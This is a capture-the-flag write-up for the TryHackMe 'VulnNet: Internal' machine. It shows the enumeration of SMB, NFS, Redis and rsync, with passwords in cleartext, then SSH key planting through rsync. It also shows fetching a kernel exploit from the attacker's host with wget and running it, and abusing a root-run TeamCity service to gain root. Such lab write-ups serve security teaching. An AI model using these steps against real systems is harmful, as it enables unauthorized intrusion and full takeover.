##VulnNet: Internal

#Enumeration
```
# Nmap 7.91 scan initiated Fri May  7 14:20:53 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,111,139,445,873,2049,6379,39931,43095,44453,45199 10.10.72.124
Nmap scan report for 10.10.72.124
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-05-07 14:20:54 PDT for 23s

PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp   open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41535/tcp6  mountd
|   100005  1,2,3      44453/tcp   mountd
|   100005  1,2,3      55094/udp6  mountd
|   100005  1,2,3      56307/udp   mountd
|   100021  1,3,4      39931/tcp   nlockmgr
|   100021  1,3,4      43695/tcp6  nlockmgr
|   100021  1,3,4      45598/udp6  nlockmgr
|   100021  1,3,4      57123/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       syn-ack ttl 61 (protocol version 31)
2049/tcp  open  nfs_acl     syn-ack ttl 61 3 (RPC #100227)
6379/tcp  open  redis       syn-ack ttl 61 Redis key-value store
39931/tcp open  nlockmgr    syn-ack ttl 61 1-4 (RPC #100021)
43095/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
44453/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
45199/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 56690/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24479/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 6851/udp): CLEAN (Failed to receive data)
|   Check 4 (port 31375/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-07T23:21:13+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-07T21:21:13
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  7 14:21:17 2021 -- 1 IP address (1 host up) scanned in 23.88 seconds
```

#Enumerating SMB
```
┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# smbmap -H 10.10.72.124
[+] Guest session       IP: 10.10.72.124:445    Name: 10.10.72.124
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (vulnnet-internal server (Samba, Ubuntu))

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# smbclient //10.10.72.124/shares
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 01:20:09 2021
  ..                                  D        0  Tue Feb  2 01:28:11 2021
  temp                                D        0  Sat Feb  6 03:45:10 2021
  data                                D        0  Tue Feb  2 01:27:33 2021

                11309648 blocks of size 1024. 3279220 blocks available

smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 03:45:10 2021
  ..                                  D        0  Tue Feb  2 01:20:09 2021
  services.txt                        N       38  Sat Feb  6 03:45:09 2021

                11309648 blocks of size 1024. 3279220 blocks available

smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 01:27:33 2021
  ..                                  D        0  Tue Feb  2 01:20:09 2021
  data.txt                            N       48  Tue Feb  2 01:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 01:27:33 2021

                11309648 blocks of size 1024. 3279220 blocks available


┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# cat services.txt
REDACTED

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# cat data.txt
Purge regularly data that is not needed anymore

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# cat business-req.txt
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

We find the services flag in services.txt and some notes that maybe will give us a hint later

#Enumerating NFS
```
┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# showmount -e 10.10.72.124
Export list for 10.10.72.124:
/opt/conf *

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# mkdir mount

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# mount -t nfs 10.10.72.124:/opt/conf mount
```
There are a few directories here for various services and their config files, but the standout is in the redis config file in which the following line is commented out

```
# requirepass REDACTED
```

So we likely have a redis password now so lets try and enumerate that next.

#Enumerating redis
```
┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# redis-cli -h 10.10.72.124 -a 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.72.124:6379> keys *
1) "int"
2) "tmp"
3) "marketlist"
4) "internal flag"
5) "authlist"
10.10.72.124:6379> get "internal flag"
"REDACTED"
10.10.72.124:6379> get authlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.72.124:6379> type authlist
list
10.10.72.124:6379> lrange authlist 0 100
```

We also checked the other keys but of interest was the internal flag and the authlist which gave us some base64 to decode and receive a rsync password from
Hcg3HP67@TW@Bc72v

#Enumerating rsync
```
┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# rsync -av --list-only rsync://10.10.72.124:873
files           Necessary home interaction

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# mkdir rsync

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# rsync -av rsync://rsync-connect@10.10.72.124:873/files ./rsync
Password:
receiving incremental file list
```

This copies all the files onto our system for us to examine. We find a the username sys-internal and the user.txt flag. After unsuccessfully looking for exposed credentials to actually establish a foothold. We decide to upload our ssh-public key and ssh into the box that way
```
┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# rsync -ahv /root/.ssh/id_rsa.pub rsync://rsync-connect@10.10.72.124:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
Password:
sending incremental file list
id_rsa.pub

sent 657 bytes  received 35 bytes  125.82 bytes/sec
total size is 563  speedup is 0.81

┌──(root💀kali)-[~/CTFS/vulnNetInternal]
└─# ssh -i /root/.ssh/id_rsa sys-internal@10.10.72.124
The authenticity of host '10.10.72.124 (10.10.72.124)' can't be established.
ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.72.124' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$
```

#Privilege Escalation
So in recently another room, https://tryhackme.com/room/overlayfs, describes a Ubuntu kernel exploit present on Ubuntu 18.04 servers. 
```
sys-internal@vulnnet-internal:~$ cd /tmp
sys-internal@vulnnet-internal:/tmp$ which gcc
/usr/bin/gcc
sys-internal@vulnnet-internal:/tmp$ wget 10.13.1.12:8000/exploit.c
--2021-05-08 00:22:55--  http://10.13.1.12:8000/exploit.c
Connecting to 10.13.1.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3559 (3.5K) [text/x-csrc]
Saving to: ‘exploit.c’

exploit.c                     100%[================================================>]   3.48K  --.-KB/s    in 0.001s

2021-05-08 00:22:56 (2.80 MB/s) - ‘exploit.c’ saved [3559/3559]

sys-internal@vulnnet-internal:/tmp$ gcc -o exploit exploit.c
sys-internal@vulnnet-internal:/tmp$ ./exploit
bash-4.4# cd /root
bash-4.4# ls -la
total 44
drwx------  8 root root 4096 Feb  6 13:32 .
drwxr-xr-x 24 root root 4096 Feb  6 12:58 ..
lrwxrwxrwx  1 root root    9 Feb  1 14:34 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  6 root root 4096 May  7 23:20 .BuildServer
drwx------  2 root root 4096 Feb  6 13:04 .cache
drwx------  4 root root 4096 Feb  6 12:59 .config
drwx------  3 root root 4096 Feb  6 12:59 .dbus
drwxr-xr-x  3 root root 4096 Feb  2 10:20 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
lrwxrwxrwx  1 root root    9 Feb  2 15:14 .rediscli_history -> /dev/null
-rw-------  1 root root   38 Feb  6 12:56 root.txt
drwx------  4 root root 4096 Feb  6 12:59 .thumbnails
```

And as simple as the at we have a root shell, I find it hard to believe this was the intended method of privilege escalation as the CVE for this exploit is fairly reason and outside the domain of services which the room has been exploring. So lets explore the services on the system and see if we can find the more intended privilege esclation method.

#Intended Privilege Escalation/TeamCity service
Ultimately after a bit of searching, if we upload linpeas it's not too hard to find, we find the TeamCity service running locally as root on port 8111 along with some possible authentication tokens in /TeamCity/logs/catalina.out. So first we put set up a port forward 

```
ssh -N -L 8111:127.0.0.1:8111 -i /root/.ssh/id_rsa sys-internal@10.10.72.124
```

once this tunnel has been set up we can connect to the service in our browser at localhost:8111 or whatever port you forwarded to and try the tokens as passwords to a blank username and see if we gain access. Sure enough one works and we have access to the console. I have never used TeamCity before so we had to some research but ultimately discover we can use it to run custom scripts on the server. To do so we do the following,
```
Create a project -> choose manually -> Create a build configuration -> choose manually -> skip VCS root -> select Build Steps(on the left sidebar) -> Add build step -> choose build runner
```

The build runner you choose here will allow you to run various types of scripts on the system such as python or command line scripts. We can just choose the build runner and the run a custom command of our choosing in the appropriate syntax. At this point there are various ways to get a root shell such as writing new superusers to /etc/passwords, giving the sys-internal user sudo privileges in /etc/sudoers, setting a sticky bit on bash to get an effective root shell, etc... ultimately choose one then save the build step and proceed to select the project and click run to execute the build and execute our build step that we configured with our custom script. Depending on what method you chose you can now go back to the system and leverage our new privilege escalation method to get a root shell and claim the root.txt flag.